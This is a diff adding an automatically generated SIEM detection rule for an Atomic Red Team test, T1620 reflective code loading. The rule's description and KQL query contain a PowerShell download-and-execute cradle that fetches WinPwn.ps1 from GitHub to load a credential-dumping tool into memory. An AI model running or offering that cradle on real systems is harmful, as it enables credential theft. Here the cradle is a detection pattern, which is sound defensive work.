@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'WinPwn - Reflectively load Mimik@tz into memory' (GUID: 56b9589c-9170-4682-8c3d-33b86ecb5119) of technique T1620 (Reflective Code Loading). Test Description: Reflectively load Mimik@tz into memory technique via function of WinPwn. Command/Steps: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn...."
+from = "now-9m"
+rule_id = "8c58af20-96c5-43ba-b489-246cd0203c0b"
+language = "kql"
+name = "Atomic Test: T1620 - WinPwn - Reflectively load Mimik@tz into memory"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1620/T1620.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1620", "56b9589c-9170-4682-8c3d-33b86ecb5119", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*iex(new-object*\\\" AND powershell.script_block_text : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')*\\\" AND powershell.script_block_text : \\\"*mimiload*\\\" OR (process.command_line : \\\"*iex(new-object*\\\" AND process.command_line : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')*\\\" AND process.command_line : \\\"*mimiload*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1620"
+name = "WinPwn - Reflectively load Mimik@tz into memory"
+reference = "https://attack.mitre.org/techniques/T1620"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1620"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1620"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1620"
+
+
